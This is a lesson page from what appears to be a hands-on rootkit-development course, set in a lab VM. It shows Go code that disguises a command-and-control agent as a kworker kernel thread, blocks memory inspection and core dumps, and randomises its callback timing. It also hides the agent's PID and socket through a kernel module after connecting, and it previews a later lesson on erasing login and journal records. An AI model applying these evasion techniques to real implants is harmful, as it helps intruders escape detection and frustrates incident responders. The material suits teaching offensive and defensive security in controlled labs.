# L23: Process Masquerade

## Mission

L22 routes browsers to the decoy page, but the agent still exposes its process
name and regular callback interval.
This exercise changes the process name, disables core dumps, and adds callback
jitter.
These controls reduce obvious indicators; they do not make a userspace process
indistinguishable from a kernel thread.

## What you will observe

The agent keeps running, but its ordinary process name changes and peer
processes can no longer read its mappings:

```console
student@victim:~$ cat /proc/1234/comm
[kworker/0:1]
student@victim:~$ cat /proc/1234/maps
cat: /proc/1234/maps: Permission denied
```

The bracketed name is camouflage, not a conversion into a kernel thread.

## Workspace

```text
exercises/L23-process-masquerade
├── go.mod
├── go.sum
└── main.go
```

Complete the process controls, callback timing, and post-connect hiding in
`main.go`.

## Change the visible thread name

Linux stores each thread's name in a 16-byte buffer (TASK_COMM_LEN).
`prctl(PR_SET_NAME, name)` overwrites it.
This is what `ps`, `top`, and `/proc/pid/comm` read.

Kernel worker threads show as `[kworker/0:1]` in `ps`.
The brackets are part of the name (the kernel adds them for threads that have no
userspace memory mapping). `[kworker/0:1]` is 13 characters, which fits in
TASK_COMM_LEN (16 bytes including the null terminator).

```go
import "golang.org/x/sys/unix"

unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
```

Or with a direct syscall:

```go
name := [16]byte{}
copy(name[:], "[kworker/0:1]")
syscall.RawSyscall6(syscall.SYS_PRCTL, unix.PR_SET_NAME,
    uintptr(unsafe.Pointer(&name[0])), 0, 0, 0, 0)
```

## Prevent useful core dumps

Two settings prevent core dumps from leaking memory contents:

```go
// Prevent ptrace and /proc/pid/mem access
unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)

// Set core dump size limit to zero
unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
```

`PR_SET_DUMPABLE` set to 0 restricts ptrace-style access and sensitive procfs
files for unprivileged peers.
Combined with the core limit, a crash produces no dump file.

## Vary the callback interval

A fixed callback interval (e.g., every 60 seconds) creates a detectable pattern
in network logs.
Adding random jitter makes the timing irregular:

```go
import "crypto/rand"

func jitter(base, spread time.Duration) time.Duration {
    var buf [8]byte
    rand.Read(buf[:])
    offset := time.Duration(binary.LittleEndian.Uint64(buf[:]) % uint64(spread))
    return base + offset
}
```

Use `crypto/rand`, not `math/rand`. `math/rand` is deterministic and seeded
predictably.

## Hide only after the connection exists

When the agent connects to the server, it should immediately hide itself using
mkdir commands to the kernel module:

```text
  agent starts
       |
       v
  prctl PR_SET_NAME "[kworker/0:1]"
  prctl PR_SET_DUMPABLE 0
  setrlimit RLIMIT_CORE 0
       |
       v
  connect to server (mTLS)
       |
       v
  mkdir rklings.h.i.<own-pid>     # hide from ps
  mkdir rklings.h.p.<local-port>  # hide the connected socket
       |
       v
  begin command loop with jitter
```

## Implement it

Complete `main.go`:

- `prctl(PR_SET_NAME, "[kworker/0:1]")` to rename process
- `prctl(PR_SET_DUMPABLE, 0)` to prevent memory access
- `setrlimit(RLIMIT_CORE, 0)` to prevent core dumps
- Jitter function using `crypto/rand`
- Auto-hide its PID and the connected socket's local port after connecting

## Use the process APIs

```go
import (
    "crypto/rand"
    "encoding/binary"
    "os"
    "syscall"
    "time"
    "unsafe"

    "golang.org/x/sys/unix"
)

// Rename process
unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)

// Prevent dumps
unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})

// Own PID
os.Getpid()

// Jitter
var buf [8]byte
crypto_rand.Read(buf[:])
```

## Test it

```sh
./rklings run L23
```

`run` starts the agent in the background.
Inspect it inside the guest:

```text
student@victim:~$ ps aux | grep kworker
root         7  0.0  0.0      0     0 ?  I    00:00 [kworker/0:0]
student   1234  0.0  0.1  12345  6789 ?  S    00:01 [kworker/0:1]
```

The agent's `comm` value is `[kworker/0:1]`.
Its userspace mappings, memory usage, executable descriptor, credentials, and
network activity remain useful distinguishing signals.
The validator supplies the real callback needed to measure connection jitter and
verify automatic concealment.

```
student@victim:~$ cat /proc/1234/comm
[kworker/0:1]
student@victim:~$ cat /proc/1234/maps
cat: /proc/1234/maps: Permission denied
```

`/proc/pid/maps` is blocked because dumpable is 0.

## Validate

```sh
./rklings validate L23
  [+] agent process comm is [kworker/0:1]
  [+] /proc/pid/comm matches [kworker/0:1]
  [+] process not dumpable (PR_SET_DUMPABLE 0)
  [+] core dump limit is zero
  [+] agent PID hidden from ps
  [+] callback intervals vary (jitter working)
  PASS
```

## Next

The process is less obvious, but the deployment still leaves timestamps, shell
commands, login records, and journal entries.
L24 identifies and clears those local records.
